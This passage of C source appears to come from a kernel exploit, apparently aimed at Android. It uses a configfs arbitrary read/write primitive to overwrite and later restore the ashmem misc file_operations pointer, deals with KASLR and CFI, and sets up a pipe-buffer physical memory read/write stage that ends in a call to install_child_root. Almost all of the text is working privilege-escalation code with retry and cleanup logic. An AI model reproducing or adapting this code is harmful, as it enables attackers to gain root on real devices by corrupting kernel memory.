  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
          misc_fops, (unsigned long long)original_fops);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  pr_info("cfi starting pipe physrw\n");

#if defined(FOPS_BEFORE_PIPE) && FOPS_BEFORE_PIPE
  for (int first_leak_attempt = 0;
       first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
       first_leak_attempt++) {
    if (first_leak_attempt != 0) {
      reset_pipe_attempt();
    }
    pipebuf_page_base = prepare_pipe_buffer_page();
    pr_info("fresh physrw pipe after verified fops page=%016zx "
            "attempt=%d/%d\n",
            pipebuf_page_base, first_leak_attempt + 1,
            PIPE_FIRST_LEAK_ATTEMPTS);
    if (is_direct_ptr(pipebuf_page_base)) {
      break;
    }
  }
  if (!is_direct_ptr(pipebuf_page_base)) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
#if defined(FOPS_BEFORE_PIPE) && FOPS_BEFORE_PIPE
      pipebuf_page_base = prepare_pipe_buffer_page();
      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
      if (!is_direct_ptr(pipebuf_page_base)) {
        continue;
      }
#endif
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  int owner_ok = fake_fops_owner_is_zero(fd);
  SYSCHK(close(fd));
  if (owner_ok &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    fake_fops_owner_is_zero(fd);
  }
  SYSCHK(close(fd));
  return 0;
}
